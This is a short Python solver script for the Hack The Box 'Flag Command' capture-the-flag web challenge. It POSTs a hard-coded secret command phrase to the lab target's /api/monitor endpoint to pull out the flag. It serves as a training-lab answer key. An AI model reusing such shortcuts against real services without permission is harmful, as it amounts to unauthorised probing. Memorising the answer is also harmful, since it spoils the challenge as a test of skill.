import requests
import argparse


parser = argparse.ArgumentParser(description="HTB Flag Command Challenge solver - extracts flag from the web game", epilog="Yeah baby")

parser.add_argument('-u','--url', required=True, help="Url of the target spawned in the HTB")
args=parser.parse_args()
url = args.url
headers = {"Content-Type":"application/json"}

data = {"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}
r = requests.post(url+"/api/monitor", json=data,headers=headers)
print(r.json())
